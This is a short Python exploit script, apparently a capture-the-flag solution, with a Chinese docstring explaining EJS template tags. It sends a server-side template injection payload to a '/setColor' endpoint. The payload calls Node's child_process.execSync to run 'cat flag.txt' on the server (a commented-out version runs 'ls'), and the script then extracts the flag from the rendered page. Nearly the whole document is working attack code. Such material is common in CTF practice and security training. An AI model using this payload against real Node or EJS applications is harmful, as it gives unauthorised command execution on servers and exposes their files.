import requests
import sys
import re
url = sys.argv[1]
if url[-1] == '/':
    url = url[:-1]
s = requests.Session()
'''
<% '脚本' 标签，用于流程控制，无输出。
<%_ 删除其前面的空格符
<%= 输出数据到模板（输出是转义 HTML 标签）
<%- 输出非转义的数据到模板
<%# 注释标签，不执行、不输出内容
<%% 输出字符串 '<%'
%> 一般结束标签
-%> 删除紧随其后的换行符
_%> 将结束标签后面的空格符删除
<%=%>，這寫法是將 res.render('index',{...}); 輸出過來的變數當值來使用。也就是說 <%= game %> 的 game 就是 game:'Final Fantasy VII'，所以這段內容 <h1><%= game %></h1> 變成 <h1>Final Fantasy VII</h1>。你就把它當作像是呼叫函式時，所傳輸過去的『參數』，這樣會比較好理解。

<%-%>，這寫法是將 res.render('index',{...}); 輸出過來的變數做保留字元來使用。也就是說其變數送過來後，會被當作 HTML 語法來使用。因此 <%- category %> 變成 <p><b>Characters:</b></p>。
'''
# rr = s.post(url + '/setColor', data={'color': '<%- this.global.process.mainModule.require("child_process").execSync("ls"); %>'})
rr = s.post(url + '/setColor', data={'color': '<%- this.global.process.mainModule.require("child_process").execSync("cat flag.txt"); %>'})
# print(rr.text)
r = s.get(url)
# print(r.text)
print(re.search(r'flag\{[0-9a-fA-F]{32}\}',r.text).group(0))